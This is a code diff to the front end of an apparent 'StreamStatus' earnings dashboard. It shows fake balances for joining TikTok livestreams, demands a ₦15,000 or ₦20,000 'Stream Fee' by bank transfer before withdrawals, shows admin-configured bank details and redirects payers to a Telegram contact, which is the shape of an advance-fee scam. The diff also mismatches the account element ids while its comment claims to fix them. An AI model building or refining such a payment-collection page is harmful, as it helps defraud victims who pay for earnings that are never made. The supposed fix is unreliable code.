@@ -596,17 +596,17 @@
                     <div class="bg-white/5 border border-white/10 rounded-2xl p-4 flex justify-between items-center">
                         <div>
                             <span class="text-[10px] uppercase font-bold text-white/40 block">Account Number</span>
-                            <b class="text-lg font-black tracking-wider text-[#b8d5b0]" id="configsaccountNumber">Loading Details...</b>
+                            <b class="text-lg font-black tracking-wider text-[#b8d5b0]" id="configaccountNumber">Loading Details...</b>
                         </div>
-                        <button onclick="navigator.clipboard.writeText(document.getElementById('configsaccountNumber').innerText); window.showStreamAlert('Account number copied!')" class="text-white/40 hover:text-[#b8d5b0] p-2"><i class="fas fa-copy"></i></button>
+                        <button onclick="navigator.clipboard.writeText(document.getElementById('configaccountNumber').innerText); window.showStreamAlert('Account number copied!')" class="text-white/40 hover:text-[#b8d5b0] p-2"><i class="fas fa-copy"></i></button>
                     </div>
 
                     <div class="bg-white/5 border border-white/10 rounded-2xl p-4 flex justify-between items-center">
                         <div>
                             <span class="text-[10px] uppercase font-bold text-white/40 block">Account Holder Name</span>
-                            <b class="text-sm font-bold tracking-wide text-white" id="configsaccountName">Loading Name...</b>
+                            <b class="text-sm font-bold tracking-wide text-white" id="configaccountName">Loading Name...</b>
                         </div>
-                        <button onclick="navigator.clipboard.writeText(document.getElementById('configsaccountName').innerText); window.showStreamAlert('Account name copied!')" class="text-white/40 hover:text-[#b8d5b0] p-2"><i class="fas fa-copy"></i></button>
+                        <button onclick="navigator.clipboard.writeText(document.getElementById('configaccountName').innerText); window.showStreamAlert('Account name copied!')" class="text-white/40 hover:text-[#b8d5b0] p-2"><i class="fas fa-copy"></i></button>
                     </div>
                 </div>
             </div>
@@ -640,11 +640,13 @@
     const db = getFirestore(app);
 
     let userPlanType = "regular";
-    let telegramUsername = "Miraclemedia"; // Default backup fallback handle
+    let telegramRedirectUrl = "https://t.me/Miraclemedia"; // Default backup fallback URL
 
     window.showStreamAlert = (msg, type = 'info') => {
         const toast = document.getElementById('streamToast');
         const title = document.getElementById('toastTitle');
+        if (!toast) return; // Guard clause in case element is missing
+        
         document.getElementById('toastMsg').innerText = msg;
         
         if(type === 'error') {
@@ -659,24 +661,26 @@
         let width = 100;
         const interval = setInterval(() => {
             width -= 2;
-            document.getElementById('toastBar').style.width = width + '%';
+            const bar = document.getElementById('toastBar');
+            if(bar) bar.style.width = width + '%';
             if (width <= 0) {
                 clearInterval(interval);
                 toast.classList.remove('show');
-                setTimeout(() => { document.getElementById('toastBar').style.width = '100%'; }, 500);
+                setTimeout(() => { if(bar) bar.style.width = '100%'; }, 500);
             }
         }, 60);
     };
 
-    // ACTIVE REALT-TIME SYNC FOR ADMIN CONFIGS (BANK DETAILS & USERNAME)
-    onSnapshot(doc(db, "configs", "paymentDetails"), (snapshot) => {
+    // FIXED: NOW MATCHES THE ADMIN PATH "configs/main" AND CORRECT HTML IDs
+    onSnapshot(doc(db, "configs", "main"), (snapshot) => {
         if (snapshot.exists()) {
             const configData = snapshot.data();
-            document.getElementById('configBank').textContent = configData.bankName || "Not Configured";
-            document.getElementById('configNumber').textContent = configData.accountNumber || "Not Configured";
-            document.getElementById('configName').textContent = configData.accountName || "Not Configured";
-            if (configData.telegramUsername) {
-                telegramUsername = configData.telegramUsername.replace('@', '');
+            document.getElementById('configBankName').textContent = configData.bankName || "Not Configured";
+            document.getElementById('configsaccountNumber').textContent = configData.accountNumber || "Not Configured";
+            document.getElementById('configsaccountName').textContent = configData.accountName || "Not Configured";
+            
+            if (configData.telegramLink) {
+                telegramRedirectUrl = configData.telegramLink;
             }
         }
     }, (error) => {
@@ -701,30 +705,32 @@
                 userPlanType = data.plan || data.selectedPlan || "regular"; 
                 
                 const firstName = fullName.split(' ')[0];
-                document.getElementById('welcomeName').textContent = `HI, ${firstName}!`;
-                document.getElementById('userEmail').textContent = user.email;
+                
+                // Safe check elements before updating dashboard view variables
+                if(document.getElementById('welcomeName')) document.getElementById('welcomeName').textContent = `HI, ${firstName}!`;
+                if(document.getElementById('userEmail')) document.getElementById('userEmail').textContent = user.email;
                 
                 const initials = fullName.split(' ').map(n => n[0]).join('').toUpperCase().slice(0, 2);
-                document.getElementById('userAvatar').innerHTML = initials || '<i class="fas fa-user"></i>';
+                if(document.getElementById('userAvatar')) document.getElementById('userAvatar').innerHTML = initials || '<i class="fas fa-user"></i>';
 
                 const isPlus = (userPlanType === 'prime');
 
                 // TRACKING AND UPDATING VALUES ACCORDING TO USER DATABASE SCHEMA
                 if (isPlus) {
-                    document.getElementById('earningsAmount').textContent = '₦20,000';
-                    document.getElementById('planBadge').textContent = 'Prime Plan';
-                    document.getElementById('balanceNote').innerHTML = 'Prime Plan – Higher daily earnings & VIP perks';
-                    document.getElementById('boostBadge').textContent = 'x15 BOOST';
-                    document.getElementById('streamMessage').textContent = 'Join Livestreams on TikTok for x15 boost (Premium Plus benefit)';
-                    document.getElementById('modalMessage').textContent = 'Activate your Stream Prime Plan account (₦20,000) to unlock VIP rewards, x15 boost and higher withdrawal limits.';
+                    if(document.getElementById('earningsAmount')) document.getElementById('earningsAmount').textContent = '₦20,000';
+                    if(document.getElementById('planBadge')) document.getElementById('planBadge').textContent = 'Prime Plan';
+                    if(document.getElementById('balanceNote')) document.getElementById('balanceNote').innerHTML = 'Prime Plan – Higher daily earnings & VIP perks';
+                    if(document.getElementById('boostBadge')) document.getElementById('boostBadge').textContent = 'x15 BOOST';
+                    if(document.getElementById('streamMessage')) document.getElementById('streamMessage').textContent = 'Join Livestreams on TikTok for x15 boost (Premium Plus benefit)';
+                    if(document.getElementById('modalMessage')) document.getElementById('modalMessage').textContent = 'Activate your Stream Prime Plan account (₦20,000) to unlock VIP rewards, x15 boost and higher withdrawal limits.';
                     document.getElementById('popAmount').textContent = '₦20,000';
                 } else {
-                    document.getElementById('earningsAmount').textContent = '₦14,000';
-                    document.getElementById('planBadge').textContent = 'Regular Plan';
-                    document.getElementById('balanceNote').innerHTML = 'Activate your account to start earning up to ₦12,200+ daily';
-                    document.getElementById('boostBadge').textContent = 'x10 BOOST';
-                    document.getElementById('streamMessage').textContent = 'Join Livestreams on TikTok for x10 boost on StreamStatus — paid in ₦';
-                    document.getElementById('modalMessage').textContent = 'Complete your Stream Fee payment (₦15,000) to unlock withdrawals and all Stream modules.';
+                    if(document.getElementById('earningsAmount')) document.getElementById('earningsAmount').textContent = '₦14,000';
+                    if(document.getElementById('planBadge')) document.getElementById('planBadge').textContent = 'Regular Plan';
+                    if(document.getElementById('balanceNote')) document.getElementById('balanceNote').innerHTML = 'Activate your account to start earning up to ₦12,200+ daily';
+                    if(document.getElementById('boostBadge')) document.getElementById('boostBadge').textContent = 'x10 BOOST';
+                    if(document.getElementById('streamMessage')) document.getElementById('streamMessage').textContent = 'Join Livestreams on TikTok for x10 boost on StreamStatus — paid in ₦';
+                    if(document.getElementById('modalMessage')) document.getElementById('modalMessage').textContent = 'Complete your Stream Fee payment (₦15,000) to unlock withdrawals and all Stream modules.';
                     document.getElementById('popAmount').textContent = '₦15,000';
                 }
 
@@ -732,16 +738,16 @@
                 const storagePaidKey = localStorage.getItem(`paid_${user.uid}`);
                 if (data.paidStatus === true || storagePaidKey === 'true') {
                     if (storagePaidKey !== 'true') localStorage.setItem(`paid_${user.uid}`, 'true');
-                    document.getElementById('balanceNote').innerHTML = `<span class="text-emerald-400 font-bold"><i class="fas fa-check-circle"></i> Account Active</span> • Balance: ₦${(data.balance || 0).toLocaleString()}`;
-                    document.getElementById('earningsAmount').textContent = `₦${(data.balance || 0).toLocaleString()}`;
+                    if(document.getElementById('balanceNote')) document.getElementById('balanceNote').innerHTML = `<span class="text-emerald-400 font-bold"><i class="fas fa-check-circle"></i> Account Active</span> • Balance: ₦${(data.balance || 0).toLocaleString()}`;
+                    if(document.getElementById('earningsAmount')) document.getElementById('earningsAmount').textContent = `₦${(data.balance || 0).toLocaleString()}`;
                 }
 
             } else {
-                window.showStreamAlert("Profile matrix document error.", "error");
+                if(window.showStreamAlert) window.showStreamAlert("Profile matrix document error.", "error");
             }
         } catch (err) {
             console.error(err);
-            window.showStreamAlert("Error fetching cloud profile metrics.", "error");
+            if(window.showStreamAlert) window.showStreamAlert("Error fetching cloud profile metrics.", "error");
         }
     });
 
@@ -749,41 +755,43 @@
     const modal = document.getElementById('activationModal');
     const detailsModal = document.getElementById('detailsModal');
 
-    const closeModal = () => { modal.style.display = 'none'; document.body.style.overflow = 'auto'; };
-    const openModal = () => { modal.style.display = 'flex'; document.body.style.overflow = 'hidden'; };
+    const closeModal = () => { if(modal) modal.style.display = 'none'; document.body.style.overflow = 'auto'; };
+    const openModal = () => { if(modal) modal.style.display = 'flex'; document.body.style.overflow = 'hidden'; };
     
     const openDetailsModal = () => {
-        closeModal(); // Close first dashboard alert layout popup
-        detailsModal.style.display = 'flex';
+        closeModal(); 
+        if(detailsModal) detailsModal.style.display = 'flex';
         document.body.style.overflow = 'hidden';
     };
-    const closeDetailsModal = () => { detailsModal.style.display = 'none'; document.body.style.overflow = 'auto'; };
+    const closeDetailsModal = () => { if(detailsModal) detailsModal.style.display = 'none'; document.body.style.overflow = 'auto'; };
     
     document.querySelectorAll('.modal-trigger').forEach(trigger => trigger.addEventListener('click', openModal));
-    document.getElementById('cancelModalLink').addEventListener('click', closeModal);
+    if(document.getElementById('cancelModalLink')) document.getElementById('cancelModalLink').addEventListener('click', closeModal);
     
     // Connect "Pay Stream Fee" button directly to full screen display view
-    document.getElementById('activateNowBtn').addEventListener('click', openDetailsModal);
-    document.getElementById('closeDetailsBtn').addEventListener('click', closeDetailsModal);
+    if(document.getElementById('activateNowBtn')) document.getElementById('activateNowBtn').addEventListener('click', openDetailsModal);
+    if(document.getElementById('closeDetailsBtn')) document.getElementById('closeDetailsBtn').addEventListener('click', closeDetailsModal);
 
-    // I Have Made Transfer Verification Procedure Action Link
+    // FIXED: REDIRECTS DIRECTLY TO THE TELEGRAM URL FETCHED FROM THE ADMIN DASHBOARD
     document.getElementById('madeTransferBtn').addEventListener('click', () => {
-        window.location.href = `https://t.me/${telegramUsername}`;
+        window.location.href = telegramRedirectUrl;
     });
 
     window.addEventListener('click', (e) => { 
         if (e.target === modal) closeModal(); 
     });
 
-    document.getElementById('logout-panel-btn').addEventListener('click', async () => {
-        try {
-            await signOut(auth);
-            window.showStreamAlert("Session severed safely.");
-            setTimeout(() => { window.location.href = 'login.html'; }, 1500);
-        } catch (err) {
-            window.showStreamAlert("Error running exit procedure.", "error");
-        }
-    });
+    if(document.getElementById('logout-panel-btn')) {
+        document.getElementById('logout-panel-btn').addEventListener('click', async () => {
+            try {
+                await signOut(auth);
+                if(window.showStreamAlert) window.showStreamAlert("Session severed safely.");
+                setTimeout(() => { window.location.href = 'login.html'; }, 1500);
+            } catch (err) {
+                if(window.showStreamAlert) window.showStreamAlert("Error running exit procedure.", "error");
+            }
+        });
+    }
 
     document.querySelectorAll('.action-btn').forEach(btn => btn.addEventListener('click', function () {
         if(this.id === 'logout-panel-btn') return;
@@ -791,5 +799,3 @@
         this.classList.add('active');
     }));
 </script>
-</body>
-</html>
